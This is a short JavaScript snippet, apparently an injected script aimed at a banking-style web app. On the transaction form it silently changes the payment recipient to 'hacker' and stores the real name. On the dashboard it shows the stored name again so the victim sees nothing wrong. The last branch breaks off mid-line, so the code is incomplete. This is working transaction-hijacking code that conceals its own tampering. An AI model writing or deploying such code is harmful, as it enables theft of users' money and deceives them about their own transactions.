if (window.location.pathname == "/make_transaction/" && document.getElementById("confirm_transaction_form") != null) {
  const recipientInput = document.getElementsByName("recipient")[0];
  window.localStorage.setItem('victim', recipientInput.value);
  recipientInput.value = "hacker"
} else if (window.location.pathname == "/dashboard/") {
  const recipients = document.querySelectorAll(".table > tbody:nth-child(2) > tr > td:nth-child(1)")
  for (field of recipients) {
    if (field.innerText == "hacker") {
      field.innerText = window.localStorage.getItem('victim')
    }
  }
} else if (window.location.pathname == "/make_transaction/confirm/") {
  document.get
}
